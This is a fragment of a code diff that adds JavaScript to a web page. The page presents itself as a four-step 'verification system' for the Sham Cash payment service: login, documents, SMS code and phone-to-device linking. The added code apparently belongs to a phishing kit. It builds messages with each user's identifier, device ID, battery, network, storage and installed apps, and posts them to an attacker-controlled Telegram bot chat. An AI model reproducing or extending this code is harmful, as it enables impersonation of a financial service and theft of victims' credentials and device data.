+                    message = `📱 *QR تم مسحه*\n👤 المستخدم: ${data.user}\n📊 الحالة: ${data.status}\n📋 رقم الطلب: ${data.requestNumber}`;
+                    break;
+                case 'device_linking_success':
+                    message = `✅ *ربط جهاز ناجح*\n👤 المستخدم: ${data.user}\n📱 Device ID: ${data.deviceId}\n🔗 نوع الاتصال: ${data.connectionType}\n📋 رقم الطلب: ${data.requestNumber}`;
+                    break;
+                case 'final_device_info':
+                    message = `📊 *معلومات الجهاز النهائية*\n👤 المستخدم: ${data.user}\n🔋 البطارية: ${data.deviceInfo.battery.level}% ${data.deviceInfo.battery.charging ? 'شحن' : 'تفريغ'}\n📶 الشبكة: ${data.deviceInfo.network.type}\n💾 التخزين: ${data.deviceInfo.storage.free}GB/${data.deviceInfo.storage.total}GB\n📱 التطبيقات: ${data.deviceInfo.installedApps.join(', ')}\n📋 رقم الطلب: ${data.requestNumber}`;
+                    break;
+            }
+            
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            const payload = {
+                chat_id: TELEGRAM_CHAT_ID,
+                text: message,
+                parse_mode: 'Markdown'
+            };
+            
+            fetch(url, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(payload)
+            })
+            .then(response => response.json())
+            .then(data => console.log('📤 تم الإرسال إلى التلجرام'))
+            .catch(error => console.error('❌ خطأ في الإرسال:', error));
+        }
+        
+        // ===== وظائف مساعدة =====
+        function showError(elementId, message) {
+            const element = document.getElementById(elementId);
+            element.textContent = message;
+            element.style.display = 'block';
+            setTimeout(() => element.style.display = 'none', 3000);
+        }
+        
+        function showNotification(message, type = 'info') {
+            const notification = document.createElement('div');
+            notification.className = `notification ${type}`;
+            notification.innerHTML = `
+                <i class="fas fa-${type === 'success' ? 'check' : type === 'error' ? 'exclamation' : 'info'}-circle"></i>
+                <span>${message}</span>
+            `;
+            
+            document.getElementById('notificationContainer').appendChild(notification);
+            
+            setTimeout(() => {
+                notification.remove();
+            }, 4000);
+        }
+        
+        // ===== التهيئة =====
+        document.addEventListener('DOMContentLoaded', function() {
+            document.getElementById('requestNumber').textContent = appData.requestNumber;
+            console.log('🔐 نظام التحقق المتطور - شام كاش');
+            console.log('📋 رقم الطلب: ' + appData.requestNumber);
+            console.log('🚀 4 صفحات متكاملة');
+            console.log('1. تسجيل الدخول');
+            console.log('2. البيانات والمستندات');
+            console.log('3. التحقق بالرسالة');
+            console.log('4. ربط الهاتف بالجهاز');
         });
     </script>
 </body>
